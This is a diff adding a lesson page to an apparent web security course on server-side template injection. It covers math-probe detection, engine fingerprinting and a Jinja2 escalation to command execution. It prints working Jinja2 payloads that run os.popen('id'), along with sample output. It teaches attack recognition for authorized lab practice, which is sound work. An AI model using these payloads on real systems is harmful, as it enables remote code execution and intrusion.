@@ -1,0 +1,83 @@
+---
+title: Server-Side Template Injection
+module: advanced-web-attacks
+moduleTitle: Advanced Web Attacks
+moduleOrder: 46
+moduleIcon: Flame
+order: 1
+summary: Your input lands in a template that gets evaluated on the server, and evaluation means code execution.
+estimatedMinutes: 20
+objectives:
+  - Detect SSTI with math payloads and tell it apart from XSS
+  - Fingerprint the engine before reaching for a payload
+  - Walk a Jinja2 injection from confirmation to command execution
+tags:
+  - web
+  - ssti
+  - rce
+  - "jinja2"
+---
+
+Type `{{7*7}}` into a field and get back `49`, and you just found something far worse than reflected input. The server took your text, treated it as template syntax, evaluated the math, and handed you the result. Templates run on the server with the app's privileges, so an injection point in one is usually a straight line to remote code execution.
+
+Server-side template injection happens when user input gets concatenated into a template string instead of passed in as a bound variable. The developer wanted `render("Hello {{ name }}", name=user_input)`. What they wrote was `render("Hello " + user_input)`. Now your input is template source, not template data, and the engine will happily execute whatever syntax it recognizes.
+
+## Detect it, and don't confuse it with XSS
+
+The math test is the fast confirmation. Send `{{7*7}}` and `${7*7}` and `#{7*7}` and `<%= 7*7 %>` in turn and watch for a `49` in the response. If the raw string comes back unchanged, no injection. If `49` comes back, the server is evaluating your input.
+
+Here is the trap: `{{7*7}}` returning `49` is server-side. `<script>alert(1)</script>` firing is client-side XSS. They look similar in a quick test but they are different bugs with different impact. XSS runs in a victim's browser. SSTI runs on the server. Confirm which one you have before you waste time on the wrong exploit path.
+
+<CommandBlock
+  title="probe every syntax family at once"
+  commands={[
+    { cmd: "{{7*7}}", comment: "Jinja2, Twig, Nunjucks return 49" },
+    { cmd: "${7*7}", comment: "FreeMarker, some JSP expression contexts" },
+    { cmd: "#{7*7}", comment: "Ruby ERB-ish, Thymeleaf" },
+    { cmd: "{{7*'7'}}", comment: "49 means Twig, 7777777 means Jinja2" },
+  ]}
+/>
+
+That last payload is the cleanest fingerprint you have. `{{7*'7'}}` returns `7777777` on Jinja2 because Python multiplies a string by an int. Twig returns `49` because it coerces the string to a number. One character of output tells you which engine you are inside, and the engine decides your whole exploit chain.
+
+<Callout type="security" title="Lab targets only">
+SSTI to RCE is one of the highest-impact web bugs there is, which is exactly why you only fire these payloads at systems you own or have written authorization to test. PortSwigger's Web Security Academy has a full SSTI track, and building a local Flask app with `render_template_string(request.args.get('name'))` gives you a safe Jinja2 target to practice the full chain.
+</Callout>
+
+## From confirmation to a shell in Jinja2
+
+Once you know it is Jinja2, you climb the Python object model to reach something that runs commands. The classic route starts from any object, walks up to its class, then to the base `object`, enumerates every subclass, and finds one that gives you os access.
+
+<CommandCard command="{{ ''.__class__.__mro__[1].__subclasses__() }}" explain="Dumps the full list of loaded subclasses. You hunt this list for something useful like subprocess.Popen or a file handle, note its index, then call it. Newer Jinja2 exploitation skips the index hunt and uses the config or namespace shortcuts instead." />
+
+The shorter modern payload reaches the same place through Jinja's own globals:
+
+<CommandBlock
+  title="Jinja2 command execution"
+  commands={[
+    { cmd: "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", comment: "os via the Flask config object" },
+    { cmd: "{{ cycler.__init__.__globals__.os.popen('id').read() }}", comment: "cleaner, uses a builtin Jinja global" },
+    { cmd: "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}", comment: "route through the request object" },
+  ]}
+/>
+
+<ExpectedOutput label="response body">
+uid=1000(app) gid=1000(app) groups=1000(app)
+</ExpectedOutput>
+
+Sandboxed engines make you work harder. Some setups strip `__class__` or block `os`, and then you are looking for gadget chains through whatever objects survive the filter. Start with the unsandboxed payloads, and only reach for filter bypasses once you have proof the engine is blocking you.
+
+<Quiz
+  id="ssti-fingerprint"
+  question="You send {{7*'7'}} and get back 7777777. What engine are you in?"
+  answer={1}
+  options={[
+    "Twig, because it coerced the string to a number",
+    "Jinja2, because Python multiplies a string by an int",
+    "FreeMarker, because it uses dollar-brace syntax",
+    "It is XSS, not SSTI",
+  ]}
+  explanation="7777777 is Python string repetition, so the backend is Jinja2. Twig would coerce '7' to 7 and return 49. That single output difference is the reliable engine fingerprint."
+/>
+
+<Notes />
